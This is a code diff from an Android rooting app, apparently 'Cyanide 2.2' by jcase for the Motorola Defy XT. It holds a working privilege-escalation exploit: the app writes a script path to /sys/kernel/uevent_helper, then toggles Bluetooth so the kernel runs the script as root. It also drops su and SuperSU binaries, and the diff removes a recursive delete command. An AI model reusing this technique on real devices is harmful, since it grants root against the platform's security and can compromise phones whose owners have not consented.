@@ -50,13 +50,9 @@ setContentView(R.layout.activity_main);
 	
 	if (stage2) {
 
-
 		//Write path to script to uevent_helper, so it is executed on hotplug event
 		exec("echo /data/last_alog/root.sh > /sys/kernel/uevent_helper");
-		
 
-		
-		
 		//Toggle bluetooth to cause hotplug event
 	    BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();    
 	    if (!mBluetoothAdapter.isEnabled()) {
@@ -64,23 +60,24 @@ setContentView(R.layout.activity_main);
 	    }else{ 
 	        mBluetoothAdapter.disable(); 
 	    } 
-	    
-		//Because bluetooth toggle wasnt working on one particular device
-		Toast toast = Toast.makeText(this, "Please turn your screen on and off, wait for reboot", Toast.LENGTH_SHORT);
-		toast.show();
+
 	    
 	} else {
-		//clean up
-		exec("rm -r /data/last_alog/*");
+
+		File link = new File ("/data/last_alog/with_love_from_jcase_again");
+		if (link.exists())
+			link.delete();
+		
 		//Dump resources to /data/last_alog
 		extractAsset("su", "/data/last_alog/su", this);
 		extractAsset("supersu.apk", "/data/last_alog/supersu.apk", this);
 		extractAsset("root.sh", "/data/last_alog/root.sh", this);
+		
 		//Make script executable
 		exec("chmod 755 /data/last_alog/root.sh");
 		
 		AlertDialog alertDialog = new AlertDialog.Builder(this).create();
-		alertDialog.setTitle("Warning");
+		alertDialog.setTitle("Cyanide 2.2 Warning");
 		alertDialog.setCancelable(false);
 		alertDialog.setMessage("Paypal donations can be made to jcase@cunninglogic.com\n\nThis is a root exploit for the Motorola Defy XT for" +
 				" Republic Wireless. This app could potentially damage your device! This app could potentially interfere with the use of your" +
